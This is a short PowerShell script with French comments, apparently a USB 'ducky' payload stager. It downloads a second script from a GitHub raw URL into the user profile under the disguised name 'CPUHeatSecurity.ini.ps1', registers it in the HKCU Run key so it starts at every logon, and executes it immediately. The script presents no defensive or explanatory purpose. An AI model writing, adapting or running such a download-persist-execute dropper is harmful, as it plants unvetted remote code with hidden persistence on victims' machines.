# Paramètres
$githubUrl = "https://raw.githubusercontent.com/Gamoboy/ducky/master/CPUHeatSecurity.ps1"
$destinationPath = "$env:USERPROFILE\CPUHeatSecurity.ini.ps1"
$autorunRegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$autorunRegistryName = "CPUHeatSecurity"
$autorunScriptCommand = "& '$destinationPath'"

# Téléchargement du script depuis GitHub
Invoke-WebRequest -Uri $githubUrl -OutFile $destinationPath

# Création de la tâche planifiée
Set-ItemProperty -Path $autorunRegistryPath -Name $autorunRegistryName -Value $autorunScriptCommand

Invoke-Expression -Command $destinationPath